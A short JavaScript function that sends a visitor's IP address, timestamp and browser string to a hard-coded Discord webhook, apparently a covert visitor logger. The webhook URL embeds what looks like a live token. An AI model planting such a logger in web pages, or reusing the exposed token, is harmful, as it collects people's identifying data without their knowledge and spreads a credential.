
function send(ip,browser){

    const webhook = "https://discord.com/api/webhooks/1269346466816852042/qN_W9h76M6DPWFP3bszZMPdWX85u7Om-mI5eiLzbUHm18h3fGNBiiSZKSLYLzpyWG_pa";

    const msg = `\n
IP: ${ip}
Time: ${new Date().toLocaleString()}
Browser: ${browser}
------------------------------`;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');

    const params = {content: msg}

    request.send(JSON.stringify(params));
        
}
